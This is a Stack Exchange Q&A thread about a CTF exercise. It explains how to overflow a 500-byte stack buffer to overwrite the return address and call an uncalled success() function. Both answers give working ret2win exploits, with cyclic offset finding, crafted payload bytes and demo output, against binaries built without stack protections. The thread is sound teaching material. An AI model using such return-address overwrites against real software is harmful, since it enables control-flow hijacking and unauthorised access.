{
    "title": "Using a buffer overflow to call a function",
    "link": "https://reverseengineering.stackexchange.com/questions/27826/using-a-buffer-overflow-to-call-a-function",
    "content": "I'm new to reverse engineering C binaries but have been working on an old ctf and thought to ask for explanation of specific assembly commands and how a buffer overflow might force a function to be called.\nI have taken apart a binary using ghidra and IDA. Its a pretty standard C program with a main() function and methods:\n<pre><code>int main(void)\n\n{\n  body();\n  return 0;\n}\n\nvoid body(void)\n\n{\n  char buffer [500];\n  int size;\n  \n  /* gather input and print to the console */\n  size = read(0,buffer,700);\n  printf(\"\nUser provided %d bytes. Buffer content is: %s\n\",size,buffer);\n  return;\n}\n</code></pre>\n(Note functions listed are reconstructed from assembly code and therefore may not be exactly correct.) It was at this point that I considered a buffer overflow must be the target of the attack.\nFurther searching the program found this function, which I concluded I wanted to call:\n<pre><code>void success(void)\n\n{\n  system(\"cat file_you_cant_access.txt\");\n  return;\n}\n</code></pre>\nThis function is never called but it clearly is the answer to the challenge. So my question is how I can modify the main/body to call this side function.\nUnfortunately I don't really understand assembly code so haven't been able to make sense of where addresses are stored and functions are called. Potentially here are some lines that could be significant (they are the lines in the helper method):\n<pre><code>/* gather input and print to the console */                     \n08048491 55              PUSH       EBP\n08048492 89 e5           MOV        EBP,ESP\n08048494 81 ec 18        SUB        ESP,0x218\n         02 00 00\n0804849a c7 44 24        MOV        dword ptr [ESP + local_214],0x2bc\n         08 bc 02 \n         00 00\n080484a2 8d 85 00        LEA        EAX=>local_204,[EBP + 0xfffffe00]\n         fe ff ff\n080484a8 89 44 24 04     MOV        dword ptr [ESP + local_218],EAX\n080484ac c7 04 24        MOV        dword ptr [ESP]=>local_21c,0x0\n         00 00 00 00\n080484b3 e8 78 fe        CALL       read                                             ssize_t read(int __fd, void * __\n         ff ff\n080484b8 89 45 f4        MOV        dword ptr [EBP + local_10],EAX\n080484bb 8d 85 00        LEA        EAX=>local_204,[EBP + 0xfffffe00]\n         fe ff ff\n080484c1 89 44 24 08     MOV        dword ptr [ESP + local_214],EAX\n080484c5 8b 45 f4        MOV        EAX,dword ptr [EBP + local_10]\n080484c8 89 44 24 04     MOV        dword ptr [ESP + local_218],EAX\n080484cc c7 04 24        MOV        dword ptr [ESP]=>local_21c,s__User_provided_%d   = \"\nUser provided %d bytes. Buf\n         a0 85 04 08\n</code></pre>\nThe issue is that it appears to not be possible to overflow the buffer into anything meaningful. If the answer isn't obvious, perhaps you can walk me through what approach you would take?\n",
    "votes": "2",
    "answers": 2,
    "views": "8k",
    "tags": [
        "c",
        "buffer-overflow"
    ],
    "user": "JFreeman",
    "time": "Jun 11, 2021 at 23:52",
    "comments": [
        {
            "user": "blabb",
            "text": "post the original your reconstruction of scanf does not seem to be correct scanf is an insecure function and iirc takes only two args a format string and a destination buffer since the function didnt check boundaries you may provide a big enough input to be written to a smaller buffer and so spill damages adjoining region at the end overwriting return address and by crafting an input which overwrites the return address on stack with a different address one can hijack the flow\n",
            "time": null
        },
        {
            "user": "blabb",
            "text": "your disassembly shows read() which is not scanf()\n",
            "time": null
        }
    ],
    "answers_data": [
        {
            "content": "Basically, when <pre><code>main</code></pre> calls <pre><code>body</code></pre>, it essentially pushes the return address (which is the value of the <pre><code>EIP</code></pre> register, containing the offset of the instruction following the <pre><code>CALL</code></pre> instruction) to the stack, and then jumps to the address of <pre><code>body</code></pre>.\nWhen <pre><code>body</code></pre> will finish running (by executing the <pre><code>RET</code></pre> instruction), it will essentially pop the return address from the stack and jump to wherever it points to. In order to hijack the flow, the attacker must somehow override the stack and place a different address instead of the original return address.\nIn the code you've attached, <pre><code>buffer</code></pre> is placed on the stack. Based on how program stacks behave, somewhere below it is the return address:\n<pre><code>+---------+\n| buffer  | \n|         |\n|         |\n+---------+\n| ...     |\n+---------+\n| ret     | \n+---------+\n</code></pre>\nThere might be a few other things between <pre><code>buffer</code></pre> and <pre><code>ret</code></pre> (such as <pre><code>size</code></pre>, or the old frame pointer), but we can ignore them for the sake of simplicity. The important point is that whatever is in between doesn't push <pre><code>ret</code></pre> \"out of reach\". Since <pre><code>buffer</code></pre> is 500 bytes long, and you are allowed to provide 700 bytes of user input, that's more than enough in order to reach <pre><code>ret</code></pre> and override it.\nSo, the plan is to provide a specially-crafted input so that <pre><code>buffer</code></pre> and <pre><code>...</code></pre> contain any random filler, but <pre><code>ret</code></pre> gets overridden with the address of <pre><code>success</code></pre>. The question now is how long that filler should be.\nIt's possible to calculate the exact length by analyzing the disassembly but there are tools that make it easier, such as cyclic. This tools generates a De-Bruijn sequence which is entered as input to the program. Assuming the input will override <pre><code>ret</code></pre>, we can take the address to which it attempted to jump to and check how far it is from the start of the input. That's the size of the filler.\nTo see this in action, we'll assume that the binary is compiled without protections (<pre><code>gcc vuln.c -o vuln -no-pie -m32 -fno-stack-protector</code></pre>) and that as pointed out by blabb, the input is received by <pre><code>read</code></pre> and not <pre><code>scanf</code></pre>.\nWe provide an input to the program using <pre><code>cyclic</code></pre>:\n<pre><code>$ cyclic -n 4 550 | ./vuln\n\nUser provided 550 bytes. Buffer content is: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaae&\nzsh: done                cyclic -n 4 550 |\nzsh: segmentation fault  ./vuln\n</code></pre>\nWe check the error log in order to recover the failing instruction pointer:\n<pre><code>$ sudo dmesg | tail -n 2\n[13575.170536] vuln[2738]: segfault at 66616165 ip 0000000066616165 sp 00000000ffeb7510 error 14 in libc-2.31.so[f7dc6000+1d000]\n[13575.170545] Code: Unable to access opcode bytes at RIP 0x6661613b.\n</code></pre>\nWe can see that the program tried to jump to <pre><code>0x66616165</code></pre>. Now we go back to <pre><code>cyclic</code></pre> to check the offset:\n<pre><code>$ cyclic -n 4 -l 0x66616165\n516\n</code></pre>\nThis means that our filler needs to be <pre><code>516</code></pre> bytes long.\nWe also need the address of <pre><code>success</code></pre> (might be different for you):\n<pre><code>$ objdump -D ./vuln | grep success\n08049182 <success>:\n</code></pre>\nWe'll create the secret file:\n<pre><code>$ echo Secret String > file_you_cant_access.txt\n</code></pre>\nAnd putting it all together, we craft the input (first the filler, then the address of <pre><code>success</code></pre>):\n<pre><code>$ python3 -c 'import sys; sys.stdout.buffer.write(b\"A\"*516 + b\"\\x82\\x91\\x04\\x08\")' | ./vuln\n\nUser provided 520 bytes. Buffer content is: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nSecret String\nzsh: done                python3 -c  |\nzsh: segmentation fault  ./vuln\n</code></pre>\nAs expected, the contents of <pre><code>file_you_cant_access.txt</code></pre> is printed (right before the program crashes since we've corrupted its stack).\n",
            "votes": "5",
            "user": "Dvd848",
            "time": "Jun 11, 2021 at 20:28",
            "is_accepted": true,
            "comments": [
                {
                    "user": "JFreeman",
                    "text": "<span class=\"comment-copy\">Excellent answer! Thank you for your explanation and linking those tools which are very useful.</span>",
                    "time": null
                }
            ]
        },
        {
            "content": "As I commented always try to post originals instead of your interpretation.\nyour interpretation of read() being scanf() is errenous.\nscanf() takes a format string like <pre><code>%s......%d.. and a destination.</code></pre>\nread() takes a <pre><code>file_descriptior, buffer and length</code></pre>\nÂ \nStart of Theory\nthat apart a buffer overflow can happen if there is no boundary checking in the functions implementation.\nscanf ,read etc are what were called insecure functions because they didn't implement bounds checking\nthat is they would blindly do as told\nread anything upto a system limited max size and would write to an insufficiently sized buffer and in the process will overwrite important data by the spill.\na buffer overflow attack is a technique where the attacker being an artisan will craft an ingenuinous input\nthis crafted input instead of scribbling all over and possibly crashing the target\nwill have the attackers destination placed on specific locations\nfor example any call to any function pushes a return address in the stack and the flow resumes at the pushed return address\nif by crafting an input that overwrites the return address on stack with a different\naddress (attackers destination or in your case the address of success function )\nthe flow will be hijacked to run the code at such address\n(in your case instead of printing how many and what will call the success function)\nthis hijacking of flow by using an overflowing buffer is termed buffer overflow attack\nend of theory\nexample code vulnerability\nyour read() takes 700 as size to read.\nyour buffer is sized as 500\nso there is a spill of 200 which can damage or is sufficient to damage or divert a return address on stack.\nit is not mentioned which os,compiler etc are used\nread is a posix function and possibly used with unistd.h in a 32bit linux system\n0 is file_descriptor for STDIN\nso you may need to do something like\necho somefilewithcraftedinput.ext | vulnerable_bin\nor like <pre><code>vulnbin < input</code></pre>\nhere is a slightly modified windows clone and demo\nthe modifications are using a smaller buffer size\nreplacing cat  with type for system()\nan extra printf to prove we actually ran an uncalled function and returned back successfully\ncontents of directory pre compilation\n<pre><code>:\\>ls -lg\ntotal 4\n-rw-r--r-- 1 197121 430 Jun 12 02:57 buffo.c\n-rw-r--r-- 1 197121  83 Jun 12 01:35 complink.bat\n-rw-r--r-- 1 197121  49 Jun 12 01:37 file_you_cant_access.txt \n-rw-r--r-- 1 197121  68 Jun 12 02:54 input.txt\n</code></pre>\nfile contents\n<pre><code>:\\>xxd -g4 input.txt\n00000000: 61616161 61616161 61616161 61616161  aaaaaaaaaaaaaaaa\n00000010: 61616161 61616161 61616161 61616161  aaaaaaaaaaaaaaaa\n00000020: 61616161 61616161 61616161 61616161  aaaaaaaaaaaaaaaa\n00000030: 61616161 61616161 61616161 00104000  aaaaaaaaaaaa..@.\n00000040: 68104000                             h.@.\n\n:\\>cat file_you_cant_access.txt\n\nthis is a successful buffer overflow attack    \n\n:\\>cat buffo.c\n#include <stdio.h>\n#include <io.h>\n#include <stdlib.h>\nvoid success(void){\n  system(\"type file_you_cant_access.txt\");\n  return;\n}\nvoid body (void){\n        char buffer[50];\n        int size;\n        size = _read(0,buffer,250);\n        printf(\"\nUser provided %d bytes. Buffer content is: %s\n\",size,buffer);\n        return;\n}\nint main(void){\n        body();\n        printf(\"Overflowed The Buffer executed an exploit and returnd  back to main()\n\");\n        return 0;\n}\n:\\>cat complink.bat\ncl /Zi /W4 /analyze /nologo /GS- /Od buffo.c /link /release /FIXED /DYNAMICBASE:NO\n</code></pre>\ncompilation and execution\n<pre><code>:\\>complink.bat\n\n:\\>cl /Zi /W4 /analyze /nologo /GS- /Od buffo.c /link /release /FIXED /DYNAMICBASE:NO\nbuffo.c\nbuffo.c(11) : warning C6386: Buffer overrun while writing to 'buffer':  \nthe writable size is '50' bytes, but '250' bytes might be written.: Lines: 9, 10, 11\n\n\n:\\>buffo.exe < input.txt\n\nUser provided 68 bytes. Buffer content is: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaD\n\nthis is a successful buffer overflow attack\n\nOverflowed The Buffer executed an exploit and returnd  back to main()\n\n:\\>\n</code></pre>\n",
            "votes": "1",
            "user": "blabb",
            "time": "Jun 11, 2021 at 22:04",
            "is_accepted": false,
            "comments": [
                {
                    "user": "JFreeman",
                    "text": "<span class=\"comment-copy\">Thank you for your comprehensive response! Everything you've written is clear and makes sense. I've extended the buffer overflow attack to suit my file. The only unclarity I have is around your choice of memory address <code>00104000 68104000</code>. Can you give a little context where you decided on these?</span>",
                    "time": null
                },
                {
                    "user": "blabb",
                    "text": "<span class=\"comment-copy\">the default base addres of an executable in windows when aslr and relocation are disabled is 0x400000. and relative address of 0x1000 and 1068 is always relatvie so 401000 and 401068 based on one time disassembly of binary</span>",
                    "time": null
                }
            ]
        }
    ]
}